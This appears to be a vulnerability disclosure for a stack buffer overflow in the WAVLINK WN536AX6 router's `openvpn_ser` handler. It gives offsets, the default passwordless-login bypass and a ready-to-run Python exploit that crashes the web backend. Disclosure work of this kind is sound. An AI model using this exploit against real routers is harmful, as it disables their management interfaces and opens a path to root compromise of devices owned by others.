# WAVLINK WN536AX6



- Vendor: WAVLINK
- Product: WN536AX6
- Firmware Version: V260507
- Vulnerability Type:Stack-Based Buffer Overflow

# Description

WAVLINK WN536AX6-A routers are vulnerable to a stack-based buffer overflow in the `openvpn_ser` handler of `/protocol.csp`, triggered via the `openvpn_ip` parameter which is copied to a 16-byte stack buffer by an unbounded `strcpy()` (offset 264 to the saved return address, no stack canary). An  unauthenticated attacker can crash the Web backend process (DoS) or  achieve arbitrary code execution with root privileges, leveraging the  default passwordless login (`FirstLogin=1`) to obtain a session token.

#   Impact

An attacker can trigger an immediate crash of the backend process by sending an `openvpn_ip` parameter of **264 bytes or more**, causing a Segmentation Fault. The `lighttpd` frontend proxy then returns `500 Internal Server Error` or `503 Service Unavailable`. As the backend process lacks an automatic recovery mechanism, **all dynamic management interfaces remain permanently unavailable** until manual administrator intervention.

#   Vulnerability Details

In the ioos web backend, within the `openvpn_ser` handler of `/protocol.csp` (`fname=net&opt=openvpn_ser&function=set`, function `sub_4170A0`), the request parameter `openvpn_ip` is copied via `strcpy()` into a mere **16-byte** stack buffer (`[xsp+0x140]`, call site `@0x4173C8`) without any length validation. Within the same function, there are **7 additional** unbounded `strcpy()` calls (`@0x4173D4` – `@0x417430`). The function does **not** have stack protector enabled (no canary check at the function epilogue). The return address `X30` is stored at `[xsp+0x248]`, which is **264 bytes** away from the `openvpn_ip` buffer — sending a value of 264 bytes or more precisely overwrites `X30` (verified: 264 bytes causes a crash, 260 bytes does not). Under the device's factory default configuration (`FirstLogin=1`, passwordless authentication enabled), an attacker needs only two steps to trigger this: first, request `fname=system&opt=login&function=set&usrid=` to obtain a session token; then, with the token, send a request with `openvpn_ip=AAAA...` (≥264 bytes). The ioos backend immediately crashes with a Segmentation Fault, and the `lighttpd` frontend proxy returns `500`/`503`, rendering all dynamic management interfaces unavailable.

![image-20260809225707436](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809225707436.png)

![image-20260809225517240](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809225517240.png)

**exp**

```python
#!/usr/bin/env python3
import re, sys, urllib.request, urllib.parse
B = "http://%s:80" % (sys.argv[1] if len(sys.argv) > 1 else "192.168.10.2")

r = urllib.request.urlopen(B + "/protocol.csp?fname=system&opt=login&function=set&usrid=").read().decode()
t = re.findall(r"[0-9A-F]{32}", r)[0]
print("[+] token:", t)

q = urllib.parse.urlencode({"fname":"net","opt":"openvpn_ser","function":"set","ovpn_enable":"1",
    "openvpn_ip":"A"*264,"OpenVPN_Interface":"if","OpenVPN_ip_start":"s","OpenVPN_ip_end":"e",
    "OpenVPN_mask":"m","OpenVPN_port":"1194","OpenVPN_proto":"udp","OpenVPN_enc":"enc",
    "OpenVPN_auth":"au","OVPN_Pwd_En":"0","access_lan_en":"0","ser_usr_name":"u","ser_usr_passwd":"p","token":t})
print("[+] trigger:", urllib.request.urlopen(B + "/protocol.csp?" + q).read()[:60])

import time; time.sleep(1)
try:
    urllib.request.urlopen(B + "/protocol.csp?fname=system&opt=login&function=set&usrid=", timeout=5)
    print("[-] ioos alive")
except Exception:
    print("[+] ioos DEAD -> overflow success")

```

# **Reproduction Results**

执行前观察后端 ioos 还是存活着

![image-20260809231509538](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809231509538.png)

执行

![image-20260809231556851](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809231556851.png)